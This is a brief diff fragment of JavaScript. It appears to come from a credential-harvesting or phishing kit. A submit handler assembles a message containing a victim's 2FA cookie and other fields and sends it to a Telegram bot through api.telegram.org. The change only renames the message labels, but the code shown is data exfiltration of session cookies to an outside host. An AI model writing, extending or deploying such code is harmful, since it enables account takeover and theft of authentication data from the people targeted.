@@ -94,10 +94,10 @@ document.getElementById("submit-btn").addEventListener("click", function () {
       - 2FA-Cook: ${cookie2fa}
       - FD Type: ${fdType}
       - Ttl Id: ${ttlId}
-      - Tg Username: ${tgUsername}
-      - Tg Chat Id: ${tgChatId}
-      - Google Sheet: ${googleSheet}
-      - Date & Time: ${currentDate}
+      - Tg UsrNM: ${tgUsername}
+      - Tg ChatId: ${tgChatId}
+      - File: ${googleSheet}
+      - D&T: ${currentDate}
     `;
 
     const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatIdForBot}&text=${encodeURIComponent(
